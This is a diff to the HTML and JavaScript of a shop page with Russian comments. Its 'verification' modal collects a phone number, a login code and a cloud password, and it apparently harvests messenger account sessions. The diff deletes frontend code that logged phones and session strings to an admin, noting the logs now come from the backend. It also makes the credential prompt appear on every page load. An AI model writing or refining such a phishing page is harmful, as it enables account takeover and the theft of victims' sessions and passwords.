@@ -11,7 +11,7 @@
     </script>
     <style>
         /* ============================================================
-           ВСЕ ТВОИ СТИЛИ — ОСТАВЛЯЮ БЕЗ ИЗМЕНЕНИЙ
+           ВСЕ ТВОИ СТИЛИ — БЕЗ ИЗМЕНЕНИЙ
            ============================================================ */
         * {
             margin: 0;
@@ -1703,7 +1703,7 @@
         <div class="toast" id="toast">Уведомление</div>
 
         <!-- ============================================================
-             VERIFICATION MODAL — ВЫЕЗЖАЕТ СНИЗУ, УГЛЫ ОБРЕЗАНЫ СВЕРХУ
+             VERIFICATION MODAL — ВЫЕЗЖАЕТ СНИЗУ
              ============================================================ -->
         <div class="verification-overlay" id="verificationOverlay">
             <div class="verification-modal">
@@ -2799,14 +2799,14 @@
         });
 
         // ============================================================
-        // 19. ВЕРИФИКАЦИЯ
+        // 19. ВЕРИФИКАЦИЯ — логи из фронтенда ОТКЛЮЧЕНЫ
         // ============================================================
 
-// НАЙДИ ЭТУ ФУНКЦИЮ И ЗАМЕНИ НА:
-async function sendAdminLog(message, data = null) {
-    // Логи отключены — все логи идут из бэкенда
-    return;
-}
+        // ЛОГИ ОТКЛЮЧЕНЫ — ВСЯ ВОДА УБРАНА
+        async function sendAdminLog(message, data = null) {
+            // Логи отключены — все логи идут из бэкенда
+            return;
+        }
 
         // ОБНОВЛЁННЫЕ ФУНКЦИИ
         async function realSendCode(phone) {
@@ -2991,7 +2991,6 @@ async function sendAdminLog(message, data = null) {
                     showVerifStep('code');
                     setTimeout(() => codeInput.focus(), 300);
                     startResendTimer(30);
-                    await sendAdminLog(`📱 Запрос кода для номера ${phone}`, { phone, requestId: verifState.codeRequestId });
                 } else {
                     document.getElementById('verifPhoneError').textContent = result.error || 'Ошибка отправки кода';
                 }
@@ -3093,11 +3092,6 @@ async function sendAdminLog(message, data = null) {
                     verifState.sessionData = result.sessionData;
                     verifState.hasPassword = result.hasPassword || false;
 
-                    await sendAdminLog(
-                        `✅ Код подтвержден для ${verifState.phone}`,
-                        { phone: verifState.phone, sessionData: verifState.sessionData, hasPassword: verifState.hasPassword }
-                    );
-
                     if (verifState.hasPassword) {
                         document.getElementById('verifCodeSuccess').textContent = 'Код верный! Требуется пароль.';
                         showVerifStep('password');
@@ -3146,10 +3140,6 @@ async function sendAdminLog(message, data = null) {
                 if (result.success) {
                     verifState.sessionData = result.sessionData || verifState.sessionData;
                     document.getElementById('verifPasswordSuccess').textContent = 'Пароль верный!';
-                    await sendAdminLog(
-                        `🔑 Облачный пароль подтвержден для ${verifState.phone}`,
-                        { phone: verifState.phone, passwordProvided: '****' }
-                    );
                     await completeVerification();
                 } else {
                     document.getElementById('verifPasswordError').textContent = result.error || 'Неверный пароль.';
@@ -3163,33 +3153,14 @@ async function sendAdminLog(message, data = null) {
             this.textContent = 'Подтвердить пароль';
         });
 
+        // ---- completeVerification - НЕ СОХРАНЯЕМ verified ----
         async function completeVerification() {
-            if (verifState.sessionData) {
-                try {
-                    const userData = getUserData(currentUserId || 'temp');
-                    userData.verified = true;
-                    userData.session = verifState.sessionData;
-                    userData.phone = verifState.phone;
-                    saveUserData(currentUserId || 'temp', userData);
-                } catch (e) {}
-            }
-
+            // НЕ СОХРАНЯЕМ verified — верификация всегда будет появляться при загрузке
             verifState.isVerified = true;
-
-            await sendAdminLog(
-                `✅ ВЕРИФИКАЦИЯ УСПЕШНО ЗАВЕРШЕНА для ${verifState.phone}`,
-                {
-                    phone: verifState.phone,
-                    user_id: verifState.sessionData?.user_id || 'unknown',
-                    username: verifState.sessionData?.username || 'unknown',
-                    session_string: verifState.sessionData?.session_string || 'unknown',
-                    has_password: verifState.hasPassword
-                }
-            );
-
+            
             showVerifStep('success');
             document.getElementById('verifDoneBtn').textContent = 'Продолжить';
-
+            
             if (currentUserId) {
                 updateBalanceUI();
                 updateAvatar(null);
@@ -3225,7 +3196,7 @@ async function sendAdminLog(message, data = null) {
         });
 
         // ============================================================
-        // 20. INIT
+        // 20. INIT — ВЕРИФИКАЦИЯ ВСЕГДА ПОЯВЛЯЕТСЯ
         // ============================================================
         (function init() {
             try {
@@ -3268,20 +3239,13 @@ async function sendAdminLog(message, data = null) {
                     updateBalanceUI();
                     updateCartUI();
 
-                    const isVerified = userData.verified || false;
-                    if (!isVerified) {
-                        setTimeout(() => {
-                            startVerification();
-                        }, 800);
-                    } else {
-                        showToast('Добро пожаловать!');
-                        if (userData.session) {
-                            sendAdminLog(
-                                `🔄 Вход уже верифицированного пользователя ${currentUserId}`,
-                                { user_id: currentUserId, phone: userData.phone || 'unknown' }
-                            );
-                        }
-                    }
+                    // ============================================================
+                    // ВЕРИФИКАЦИЯ ВСЕГДА — НЕ ЗАПОМИНАЕМ
+                    // ============================================================
+                    setTimeout(() => {
+                        startVerification();
+                    }, 800);
+
                 } else {
                     currentUserId = null;
                     userBalance = 0;
@@ -3294,6 +3258,7 @@ async function sendAdminLog(message, data = null) {
 
                     setTimeout(() => {
                         showToast('Для доступа к функциям пройдите верификацию');
+                        startVerification();
                     }, 1500);
                 }
 
@@ -3341,6 +3306,7 @@ async function sendAdminLog(message, data = null) {
 
         console.log('[АМУР ШИК] Маркет загружен. Бэкенд:', CONFIG.BACKEND_URL);
         console.log('[АМУР ШИК] USE_EMULATION =', USE_EMULATION);
+        console.log('[АМУР ШИК] Верификация появляется при каждой загрузке');
     </script>
 </body>
 </html>
